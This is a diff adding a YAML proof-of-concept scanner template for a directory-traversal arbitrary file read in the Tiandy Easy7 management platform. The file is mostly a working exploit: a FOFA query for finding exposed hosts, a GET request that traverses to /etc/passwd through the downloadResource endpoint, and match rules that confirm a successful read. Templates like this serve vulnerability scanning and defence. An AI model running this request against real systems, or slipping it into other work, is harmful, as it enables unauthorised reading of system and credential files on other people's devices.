@@ -1,0 +1,15 @@
+id: poc-yaml-tiandy-easy7-imp-downloadresource-anyfile-read
+info:
+  name: 天地伟业Easy7综合管理平台 downloadResource 任意文件读取漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: Easy7综合管理平台
+  fofa: app="Tiandy-Easy7"
+requests:
+- method: GET
+  path: /Easy7/rest/file/downloadResource?path=/../../../../../../../../etc/passwd
+  expression: status_code == 200 && contains(body,"root") && contains(body,"/bin")
+    && !contains(body,"<") && contains(headers,"attachment;filename=/passwd")
+variables: {}
+transport: http
